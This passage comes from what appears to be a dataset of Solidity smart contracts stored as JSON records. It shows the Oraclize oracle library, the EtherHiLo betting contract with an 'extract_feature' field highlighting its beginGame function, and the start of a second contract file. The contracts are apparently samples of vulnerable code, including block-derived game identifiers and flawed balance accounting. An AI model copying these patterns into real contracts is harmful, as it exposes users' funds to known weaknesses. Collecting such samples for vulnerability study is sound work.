_d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal pure returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal pure returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal pure returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal pure returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i=0; i<bresult.length; i++){\n if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\n if (decimals){\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n if (_b > 0) mint *= 10**_b;\n return mint;\n }\n function uint2str(uint i) internal pure returns (string){\n if (i == 0) return \"0\";\n uint j = i;\n uint len;\n while (j != 0){\n len++;\n j /= 10;\n }\n bytes memory bstr = new bytes(len);\n uint k = len - 1;\n while (i != 0){\n bstr[k--] = byte(48 + i % 10);\n i /= 10;\n }\n return string(bstr);\n }\n using CBOR for Buffer.buffer;\n function stra2cbor(string[] arr) internal pure returns (bytes) {\n safeMemoryCleaner();\n Buffer.buffer memory buf;\n Buffer.init(buf, 1024);\n buf.startArray();\n for (uint i = 0; i < arr.length; i++) {\n buf.encodeString(arr[i]);\n }\n buf.endSequence();\n return buf.buf;\n }\n function ba2cbor(bytes[] arr) internal pure returns (bytes) {\n safeMemoryCleaner();\n Buffer.buffer memory buf;\n Buffer.init(buf, 1024);\n buf.startArray();\n for (uint i = 0; i < arr.length; i++) {\n buf.encodeBytes(arr[i]);\n }\n buf.endSequence();\n return buf.buf;\n }\n string oraclize_network_name;\n function oraclize_setNetworkName(string _network_name) internal {\n oraclize_network_name = _network_name;\n }\n function oraclize_getNetworkName() internal view returns (string) {\n return oraclize_network_name;\n }\n function oraclize_newRandomDSQuery(uint _delay, uint _nbytes, uint _customGasLimit) internal returns (bytes32){\n require((_nbytes > 0) && (_nbytes <= 32));\n _delay *= 10;\n bytes memory nbytes = new bytes(1);\n nbytes[0] = byte(_nbytes);\n bytes memory unonce = new bytes(32);\n bytes memory sessionKeyHash = new bytes(32);\n bytes32 sessionKeyHash_bytes32 = oraclize_randomDS_getSessionPubKeyHash();\n assembly {\n mstore(unonce, 0x20)\n mstore(add(unonce, 0x20), xor(blockhash(sub(number, 1)), xor(coinbase, timestamp)))\n mstore(sessionKeyHash, 0x20)\n mstore(add(sessionKeyHash, 0x20), sessionKeyHash_bytes32)\n }\n bytes memory delay = new bytes(32);\n assembly {\n mstore(add(delay, 0x20), _delay)\n }\n bytes memory delay_bytes8 = new bytes(8);\n copyBytes(delay, 24, 8, delay_bytes8, 0);\n bytes[4] memory args = [unonce, nbytes, sessionKeyHash, delay];\n bytes32 queryId = oraclize_query(\"random\", args, _customGasLimit);\n bytes memory delay_bytes8_left = new bytes(8);\n assembly {\n let x := mload(add(delay_bytes8, 0x20))\n mstore8(add(delay_bytes8_left, 0x27), div(x, 0x100000000000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x26), div(x, 0x1000000000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x25), div(x, 0x10000000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x24), div(x, 0x100000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x23), div(x, 0x1000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x22), div(x, 0x10000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x21), div(x, 0x100000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x20), div(x, 0x1000000000000000000000000000000000000000000000000))\n }\n oraclize_randomDS_setCommitment(queryId, keccak256(delay_bytes8_left, args[1], sha256(args[0]), args[2]));\n return queryId;\n }\n function oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) internal {\n oraclize_randomDS_args[queryId] = commitment;\n }\n mapping(bytes32=>bytes32) oraclize_randomDS_args;\n mapping(bytes32=>bool) oraclize_randomDS_sessionKeysHashVerified;\n function verifySig(bytes32 tosignh, bytes dersig, bytes pubkey) internal returns (bool){\n bool sigok;\n address signer;\n bytes32 sigr;\n bytes32 sigs;\n bytes memory sigr_ = new bytes(32);\n uint offset = 4+(uint(dersig[3]) - 0x20);\n sigr_ = copyBytes(dersig, offset, 32, sigr_, 0);\n bytes memory sigs_ = new bytes(32);\n offset += 32 + 2;\n sigs_ = copyBytes(dersig, offset+(uint(dersig[offset-1]) - 0x20), 32, sigs_, 0);\n assembly {\n sigr := mload(add(sigr_, 32))\n sigs := mload(add(sigs_, 32))\n }\n (sigok, signer) = safer_ecrecover(tosignh, 27, sigr, sigs);\n if (address(keccak256(pubkey)) == signer) return true;\n else {\n (sigok, signer) = safer_ecrecover(tosignh, 28, sigr, sigs);\n return (address(keccak256(pubkey)) == signer);\n }\n }\n function oraclize_randomDS_proofVerify__sessionKeyValidity(bytes proof, uint sig2offset) internal returns (bool) {\n bool sigok;\n bytes memory sig2 = new bytes(uint(proof[sig2offset+1])+2);\n copyBytes(proof, sig2offset, sig2.length, sig2, 0);\n bytes memory appkey1_pubkey = new bytes(64);\n copyBytes(proof, 3+1, 64, appkey1_pubkey, 0);\n bytes memory tosign2 = new bytes(1+65+32);\n tosign2[0] = byte(1);\n copyBytes(proof, sig2offset-65, 65, tosign2, 1);\n bytes memory CODEHASH = hex\"fd94fa71bc0ba10d39d464d0d8f465efeef0a2764e3887fcc9df41ded20f505c\";\n copyBytes(CODEHASH, 0, 32, tosign2, 1+65);\n sigok = verifySig(sha256(tosign2), sig2, appkey1_pubkey);\n if (sigok == false) return false;\n bytes memory LEDGERKEY = hex\"7fb956469c5c9b89840d55b43537e66a98dd4811ea0a27224272c2e5622911e8537a2f8e86a46baec82864e98dd01e9ccc2f8bc5dfc9cbe5a91a290498dd96e4\";\n bytes memory tosign3 = new bytes(1+65);\n tosign3[0] = 0xFE;\n copyBytes(proof, 3, 65, tosign3, 1);\n bytes memory sig3 = new bytes(uint(proof[3+65+1])+2);\n copyBytes(proof, 3+65, sig3.length, sig3, 0);\n sigok = verifySig(sha256(tosign3), sig3, LEDGERKEY);\n return sigok;\n }\n modifier oraclize_randomDS_proofVerify(bytes32 _queryId, string _result, bytes _proof) {\n require((_proof[0] == \"L\") && (_proof[1] == \"P\") && (_proof[2] == 1));\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n require(proofVerified);\n _;\n }\n function oraclize_randomDS_proofVerify__returnCode(bytes32 _queryId, string _result, bytes _proof) internal returns (uint8){\n if ((_proof[0] != \"L\")||(_proof[1] != \"P\")||(_proof[2] != 1)) return 1;\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n if (proofVerified == false) return 2;\n return 0;\n }\n function matchBytes32Prefix(bytes32 content, bytes prefix, uint n_random_bytes) internal pure returns (bool){\n bool match_ = true;\n require(prefix.length == n_random_bytes);\n for (uint256 i=0; i< n_random_bytes; i++) {\n if (content[i] != prefix[i]) match_ = false;\n }\n return match_;\n }\n function oraclize_randomDS_proofVerify__main(bytes proof, bytes32 queryId, bytes result, string context_name) internal returns (bool){\n uint ledgerProofLength = 3+65+(uint(proof[3+65+1])+2)+32;\n bytes memory keyhash = new bytes(32);\n copyBytes(proof, ledgerProofLength, 32, keyhash, 0);\n if (!(keccak256(keyhash) == keccak256(sha256(context_name, queryId)))) return false;\n bytes memory sig1 = new bytes(uint(proof[ledgerProofLength+(32+8+1+32)+1])+2);\n copyBytes(proof, ledgerProofLength+(32+8+1+32), sig1.length, sig1, 0);\n if (!matchBytes32Prefix(sha256(sig1), result, uint(proof[ledgerProofLength+32+8]))) return false;\n bytes memory commitmentSlice1 = new bytes(8+1+32);\n copyBytes(proof, ledgerProofLength+32, 8+1+32, commitmentSlice1, 0);\n bytes memory sessionPubkey = new bytes(64);\n uint sig2offset = ledgerProofLength+32+(8+1+32)+sig1.length+65;\n copyBytes(proof, sig2offset-64, 64, sessionPubkey, 0);\n bytes32 sessionPubkeyHash = sha256(sessionPubkey);\n if (oraclize_randomDS_args[queryId] == keccak256(commitmentSlice1, sessionPubkeyHash)){\n delete oraclize_randomDS_args[queryId];\n } else return false;\n bytes memory tosign1 = new bytes(32+8+1+32);\n copyBytes(proof, ledgerProofLength, 32+8+1+32, tosign1, 0);\n if (!verifySig(sha256(tosign1), sig1, sessionPubkey)) return false;\n if (oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] == false){\n oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] = oraclize_randomDS_proofVerify__sessionKeyValidity(proof, sig2offset);\n }\n return oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash];\n }\n function copyBytes(bytes from, uint fromOffset, uint length, bytes to, uint toOffset) internal pure returns (bytes) {\n uint minLength = length + toOffset;\n require(to.length >= minLength);\n uint i = 32 + fromOffset;\n uint j = 32 + toOffset;\n while (i < (32 + fromOffset + length)) {\n assembly {\n let tmp := mload(add(from, i))\n mstore(add(to, j), tmp)\n }\n i += 32;\n j += 32;\n }\n return to;\n }\n function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\n bool ret;\n address addr;\n assembly {\n let size := mload(0x40)\n mstore(size, hash)\n mstore(add(size, 32), v)\n mstore(add(size, 64), r)\n mstore(add(size, 96), s)\n ret := call(3000, 1, 0, size, 128, size, 32)\n addr := mload(size)\n }\n return (ret, addr);\n }\n function ecrecovery(bytes32 hash, bytes sig) internal returns (bool, address) {\n bytes32 r;\n bytes32 s;\n uint8 v;\n if (sig.length != 65)\n return (false, 0);\n assembly {\n r := mload(add(sig, 32))\n s := mload(add(sig, 64))\n v := byte(0, mload(add(sig, 96)))\n }\n if (v < 27)\n v += 27;\n if (v != 27 && v != 28)\n return (false, 0);\n return safer_ecrecover(hash, v, r, s);\n }\n function safeMemoryCleaner() internal pure {\n assembly {\n let fmem := mload(0x40)\n codecopy(fmem, codesize, sub(msize, fmem))\n }\n }\n}\npragma solidity ^0.4.20;\ncontract EtherHiLo is usingOraclize, Ownable {\n uint8 constant NUM_DICE_SIDES = 13;\n uint8 constant FAILED_ROLE = 69;\n uint public rngCallbackGas = 500000;\n uint public minBet = 100 finney;\n uint public maxBetThresholdPct = 75;\n bool public gameRunning = false;\n uint public balanceInPlay;\n mapping(address => Game) private gamesInProgress;\n mapping(bytes32 => address) private rollIdToGameAddress;\n mapping(bytes32 => uint) private failedRolls;\n event GameFinished(address indexed player, uint indexed playerGameNumber, uint bet, uint8 firstRoll, uint8 finalRoll, uint winnings, uint payout);\n event GameError(address indexed player, uint indexed playerGameNumber, bytes32 rollId);\n enum BetDirection {\n None,\n Low,\n High\n }\n enum GameState {\n None,\n WaitingForFirstCard,\n WaitingForDirection,\n WaitingForFinalCard,\n Finished\n }\n struct Game {\n address player;\n GameState state;\n uint id;\n BetDirection direction;\n uint bet;\n uint8 firstRoll;\n uint8 finalRoll;\n uint winnings;\n }\n function EtherHiLo() public {\n }\n function() external payable {\n }\n function beginGame() public payable {\n address player = msg.sender;\n uint bet = msg.value;\n require(player != address(0));\n require(gamesInProgress[player].state == GameState.None\n || gamesInProgress[player].state == GameState.Finished,\n \"Invalid game state\");\n require(gameRunning, \"Game is not currently running\");\n require(bet >= minBet && bet <= getMaxBet(), \"Invalid bet\");\n Game memory game = Game({\n id: uint(keccak256(block.number, player, bet)),\n player: player,\n state: GameState.WaitingForFirstCard,\n bet: bet,\n firstRoll: 0,\n finalRoll: 0,\n winnings: 0,\n direction: BetDirection.None\n });\n balanceInPlay = SafeMath.add(balanceInPlay, game.bet);\n gamesInProgress[player] = game;\n require(rollDie(player), \"Dice roll failed\");\n }\n function finishGame(BetDirection direction) public {\n address player = msg.sender;\n require(player != address(0));\n require(gamesInProgress[player].state == GameState.WaitingForDirection,\n \"Invalid game state\");\n Game storage game = gamesInProgress[player];\n game.direction = direction;\n game.state = GameState.WaitingForFinalCard;\n gamesInProgress[player] = game;\n require(rollDie(player), \"Dice roll failed\");\n }\n function getGameState(address player) public view returns\n (GameState, uint, BetDirection, uint, uint8, uint8, uint) {\n return (\n gamesInProgress[player].state,\n gamesInProgress[player].id,\n gamesInProgress[player].direction,\n gamesInProgress[player].bet,\n gamesInProgress[player].firstRoll,\n gamesInProgress[player].finalRoll,\n gamesInProgress[player].winnings\n );\n }\n function getMinBet() public view returns (uint) {\n return minBet;\n }\n function getMaxBet() public view returns (uint) {\n return SafeMath.div(SafeMath.div(SafeMath.mul(SafeMath.sub(this.balance, balanceInPlay), maxBetThresholdPct), 100), 12);\n }\n function calculateWinnings(uint bet, uint percent) public pure returns (uint) {\n return SafeMath.div(SafeMath.mul(bet, percent), 100);\n }\n function getLowWinPercent(uint number) public pure returns (uint) {\n require(number >= 2 && number <= NUM_DICE_SIDES, \"Invalid number\");\n if (number == 2) {\n return 1200;\n } else if (number == 3) {\n return 500;\n } else if (number == 4) {\n return 300;\n } else if (number == 5) {\n return 300;\n } else if (number == 6) {\n return 200;\n } else if (number == 7) {\n return 180;\n } else if (number == 8) {\n return 150;\n } else if (number == 9) {\n return 140;\n } else if (number == 10) {\n return 130;\n } else if (number == 11) {\n return 120;\n } else if (number == 12) {\n return 110;\n } else if (number == 13) {\n return 100;\n }\n }\n function getHighWinPercent(uint number) public pure returns (uint) {\n require(number >= 1 && number < NUM_DICE_SIDES, \"Invalid number\");\n if (number == 1) {\n return 100;\n } else if (number == 2) {\n return 110;\n } else if (number == 3) {\n return 120;\n } else if (number == 4) {\n return 130;\n } else if (number == 5) {\n return 140;\n } else if (number == 6) {\n return 150;\n } else if (number == 7) {\n return 180;\n } else if (number == 8) {\n return 200;\n } else if (number == 9) {\n return 300;\n } else if (number == 10) {\n return 300;\n } else if (number == 11) {\n return 500;\n } else if (number == 12) {\n return 1200;\n }\n }\n function processDiceRoll(address player, uint8 roll) private {\n Game storage game = gamesInProgress[player];\n if (game.firstRoll == 0) {\n game.firstRoll = roll;\n game.state = GameState.WaitingForDirection;\n gamesInProgress[player] = game;\n return;\n }\n require(gamesInProgress[player].state == GameState.WaitingForFinalCard,\n \"Invalid game state\");\n uint8 finalRoll = roll;\n uint winnings = 0;\n if (game.direction == BetDirection.High && finalRoll > game.firstRoll) {\n winnings = calculateWinnings(game.bet, getHighWinPercent(game.firstRoll));\n } else if (game.direction == BetDirection.Low && finalRoll < game.firstRoll) {\n winnings = calculateWinnings(game.bet, getLowWinPercent(game.firstRoll));\n }\n uint transferAmount = winnings;\n if (transferAmount > this.balance) {\n if (game.bet < this.balance) {\n transferAmount = game.bet;\n } else {\n transferAmount = SafeMath.div(SafeMath.mul(this.balance, 90), 100);\n }\n }\n balanceInPlay = SafeMath.add(balanceInPlay, game.bet);\n game.finalRoll = finalRoll;\n game.winnings = winnings;\n game.state = GameState.Finished;\n gamesInProgress[player] = game;\n if (transferAmount > 0) {\n game.player.transfer(transferAmount);\n }\n GameFinished(player, game.id, game.bet, game.firstRoll, finalRoll, winnings, transferAmount);\n }\n function rollDie(address player) private returns (bool) {\n bytes32 rollId = oraclize_newRandomDSQuery(0, 7, rngCallbackGas);\n if (failedRolls[rollId] == FAILED_ROLE) {\n delete failedRolls[rollId];\n return false;\n }\n rollIdToGameAddress[rollId] = player;\n return true;\n }\n function __callback(bytes32 rollId, string _result, bytes _proof) public {\n require(msg.sender == oraclize_cbAddress(), \"Only Oraclize can call this method\");\n address player = rollIdToGameAddress[rollId];\n if (player == address(0)) {\n failedRolls[rollId] = FAILED_ROLE;\n return;\n }\n if (oraclize_randomDS_proofVerify__returnCode(rollId, _result, _proof) != 0) {\n Game storage game = gamesInProgress[player];\n if (game.bet > 0) {\n game.player.transfer(game.bet);\n }\n delete gamesInProgress[player];\n delete rollIdToGameAddress[rollId];\n delete failedRolls[rollId];\n GameError(player, game.id, rollId);\n } else {\n uint8 randomNumber = uint8((uint(keccak256(_result)) % NUM_DICE_SIDES) + 1);\n processDiceRoll(player, randomNumber);\n delete rollIdToGameAddress[rollId];\n }\n }\n function transferBalance(address to, uint amount) public onlyOwner {\n to.transfer(amount);\n }\n function cleanupAbandonedGame(address player) public onlyOwner {\n require(player != address(0));\n Game storage game = gamesInProgress[player];\n require(game.player != address(0));\n game.player.transfer(game.bet);\n delete gamesInProgress[game.player];\n }\n function setRNGCallbackGasConfig(uint gas, uint price) public onlyOwner {\n rngCallbackGas = gas;\n oraclize_setProof(proofType_Ledger);\n oraclize_setCustomGasPrice(price);\n }\n function setMinBet(uint bet) public onlyOwner {\n minBet = bet;\n }\n function setGameRunning(bool v) public onlyOwner {\n gameRunning = v;\n }\n function setMaxBetThresholdPct(uint v) public onlyOwner {\n maxBetThresholdPct = v;\n }\n function destroyAndSend(address _recipient) public onlyOwner {\n selfdestruct(_recipient);\n }\n}",
  "extract_feature": [
    "function beginGame() public payable {\naddress player = msg.sender;\nuint bet = msg.value;\nrequire(player != address(0));\nrequire(gamesInProgress[player].state == GameState.None\n|| gamesInProgress[player].state == GameState.Finished,\n\"Invalid game state\");\nrequire(gameRunning, \"Game is not currently running\");\nrequire(bet >= minBet && bet <= getMaxBet(), \"Invalid bet\");\nGame memory game = Game({\nid: uint(keccak256(block.number, player, bet)),\nplayer: player,\nstate: GameState.WaitingForFirstCard,\nbet: bet,\nfirstRoll: 0,\nfinalRoll: 0,\nwinnings: 0,\ndirection: BetDirection.None\n});\nbalanceInPlay = SafeMath.add(balanceInPlay, game.bet);\ngamesInProgress[player] = game;\nrequire(rollDie(player), \"Dice roll failed\");\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b38"
  },
  "filename": "1968.sol",
  "content": "pragma solidity ^0.4.11;\npragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n if (_a == 0) {\n return 0;\n }\n c = _a * _b;\n assert(c / _a == _b);\n return c;\n }\n function div(uint256 _a, uint256 _b) internal pure returns (uint256) {\n return _a / _b;\n }\n function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\n assert(_b <= _a);\n return _a - _b;\n }\n function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n c = _a + _b;\n assert(c >= _a);\n return c;\n }\n}\npragma solidity ^0.4.24;\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\npragma solidity >=0.4.18;\ncontract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) external payable returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) external payable returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) public payable returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) external payable returns (bytes32 _id);\n function queryN(uint _timestamp, string _datasource, bytes _argN) public payable returns (bytes32 _id);\n function queryN_withGasLimit(uint _timestamp, string _datasource, bytes _argN, uint _gaslimit) external payable returns (bytes32 _id);\n function getPrice(string _datasource) public returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) public returns (uint _dsprice);\n function setProofType(byte _proofType) external;\n function setCustomGasPrice(uint _gasPrice) external;\n function randomDS_getSessionPubKeyHash() external constant returns(bytes32);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() public returns (address _addr);\n}\nlibrary Buffer {\n struct buffer {\n bytes buf;\n uint capacity;\n }\n function init(buffer memory buf, uint _capacity) internal pure {\n uint capacity = _capacity;\n if(capacity % 32 != 0) capacity += 32 - (capacity % 32);\n buf.capacity = capacity;\n assembly {\n let ptr := mload(0x40)\n mstore(buf, ptr)\n mstore(ptr, 0)\n mstore(0x40, add(ptr, capacity))\n }\n }\n function resize(buffer memory buf, uint capacity) private pure {\n bytes memory oldbuf = buf.buf;\n init(buf, capacity);\n append(buf, oldbuf);\n }\n function max(uint a, uint b) private pure returns(uint) {\n if(a > b) {\n return a;\n }\n return b;\n }\n function append(buffer memory buf, bytes data) internal pure returns(buffer memory) {\n if(data.length + buf.buf.length > buf.capacity) {\n resize(buf, max(buf.capacity, data.length) * 2);\n }\n uint dest;\n uint src;\n uint len = data.length;\n assembly {\n let bufptr := mload(buf)\n let buflen := mload(bufptr)\n dest := add(add(bufptr, buflen), 32)\n mstore(bufptr, add(buflen, mload(data)))\n src := add(data, 32)\n }\n for(; len >= 32; len -= 32) {\n assembly {\n mstore(dest, mload(src))\n }\n dest += 32;\n src += 32;\n }\n uint mask = 256 ** (32 - len) - 1;\n assembly {\n let srcpart := and(mload(src), not(mask))\n let destpart := and(mload(dest), mask)\n mstore(dest, or(destpart, srcpart))\n }\n return buf;\n }\n function append(buffer memory buf, uint8 data) internal pure {\n if(buf.buf.length + 1 > buf.capacity) {\n resize(buf, buf.capacity * 2);\n }\n assembly {\n let bufptr := mload(buf)\n let buflen := mload(bufptr)\n let dest := add(add(bufptr, buflen), 32)\n mstore8(dest, data)\n mstore(bufptr, add(buflen, 1))\n }\n }\n function appendInt(buffer memory buf, uint data, uint len) internal pure returns(buffer memory) {\n if(len + buf.buf.length > buf.capacity) {\n resize(buf, max(buf.capacity, len) * 2);\n }\n uint mask = 256 ** len - 1;\n assembly {\n let bufptr := mload(buf)\n let buflen := mload(bufptr)\n let dest := add(add(bufptr, buflen), len)\n mstore(dest, or(and(mload(dest), not(mask)), data))\n mstore(bufptr, add(buflen, len))\n }\n return buf;\n }\n}\nlibrary CBOR {\n using Buffer for Buffer.buffer;\n uint8 private constant MAJOR_TYPE_INT = 0;\n uint8 private constant MAJOR_TYPE_NEGATIVE_INT = 1;\n uint8 private constant MAJOR_TYPE_BYTES = 2;\n uint8 private constant MAJOR_TYPE_STRING = 3;\n uint8 private constant MAJOR_TYPE_ARRAY = 4;\n uint8 private constant MAJOR_TYPE_MAP = 5;\n uint8 private constant MAJOR_TYPE_CONTENT_FREE = 7;\n function encodeType(Buffer.buffer memory buf, uint8 major, uint value) private pure {\n if(value <= 23) {\n buf.append(uint8((major << 5) | value));\n } else if(value <= 0xFF) {\n buf.append(uint8((major << 5) | 24));\n buf.appendInt(value, 1);\n } else if(value <= 0xFFFF) {\n buf.append(uint8((major << 5) | 25));\n buf.appendInt(value, 2);\n } else if(value <= 0xFFFFFFFF) {\n buf.append(uint8((major << 5) | 26));\n buf.appendInt(value, 4);\n } else if(value <= 0xFFFFFFFFFFFFFFFF) {\n buf.append(uint8((major << 5) | 27));\n buf.appendInt(value, 8);\n }\n }\n function encodeIndefiniteLengthType(Buffer.buffer memory buf, uint8 major) private pure {\n buf.append(uint8((major << 5) | 31));\n }\n function encodeUInt(Buffer.buffer memory buf, uint value) internal pure {\n encodeType(buf, MAJOR_TYPE_INT, value);\n }\n function encodeInt(Buffer.buffer memory buf, int value) internal pure {\n if(value >= 0) {\n encodeType(buf, MAJOR_TYPE_INT, uint(value));\n } else {\n encodeType(buf, MAJOR_TYPE_NEGATIVE_INT, uint(-1 - value));\n }\n }\n function encodeBytes(Buffer.buffer memory buf, bytes value) internal pure {\n encodeType(buf, MAJOR_TYPE_BYTES, value.length);\n buf.append(value);\n }\n function encodeString(Buffer.buffer memory buf, string value) internal pure {\n encodeType(buf, MAJOR_TYPE_STRING, bytes(value).length);\n buf.append(bytes(value));\n }\n function startArray(Buffer.buffer memory buf) internal pure {\n encodeIndefiniteLengthType(buf, MAJOR_TYPE_ARRAY);\n }\n function startMap(Buffer.buffer memory buf) internal pure {\n encodeIndefiniteLengthType(buf, MAJOR_TYPE_MAP);\n }\n function endSequence(Buffer.buffer memory buf) internal pure {\n encodeIndefiniteLengthType(buf, MAJOR_TYPE_CONTENT_FREE);\n }\n}\ncontract usingOraclize {\n uint constant day = 60*60*24;\n uint constant week = 60*60*24*7;\n uint constant month = 60*60*24*30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofType_Ledger = 0x30;\n byte constant proofType_Android = 0x40;\n byte constant proofType_Native = 0xF0;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n if((address(OAR)==0)||(getCodeSize(address(OAR))==0))\n oraclize_setNetwork(networkID_auto);\n if(address(oraclize) != OAR.getAddress())\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n function oraclize_setNetwork(uint8 networkID) internal returns(bool){\n return oraclize_setNetwork();\n networkID;\n }\n function oraclize_setNetwork() internal returns(bool){\n if (getCodeSize(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed)>0){\n OAR = OraclizeAddrResolverI(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed);\n oraclize_setNetworkName(\"eth_mainnet\");\n return true;\n }\n if (getCodeSize(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1)>0){\n OAR = OraclizeAddrResolverI(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1);\n oraclize_setNetworkName(\"eth_ropsten3\");\n return true;\n }\n if (getCodeSize(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e)>0){\n OAR = OraclizeAddrResolverI(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e);\n oraclize_setNetworkName(\"eth_kovan\");\n return true;\n }\n if (getCodeSize(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48)>0){\n OAR = OraclizeAddrResolverI(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48);\n oraclize_setNetworkName(\"eth_rinkeby\");\n return true;\n }\n if (getCodeSize(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475)>0){\n OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);\n return true;\n }\n if (getCodeSize(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF)>0){\n OAR = OraclizeAddrResolverI(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF);\n return true;\n }\n if (getCodeSize(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA)>0){\n OAR = OraclizeAddrResolverI(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA);\n return true;\n }\n return false;\n }\n function __callback(bytes32 myid, string result) public {\n __callback(myid, result, new bytes(0));\n }\n function __callback(bytes32 myid, string result, bytes proof) public {\n return;\n myid; result; proof;\n }\n function oraclize_getPrice(string datasource) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource);\n }\n function oraclize_getPrice(string datasource, uint gaslimit) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource, gaslimit);\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + 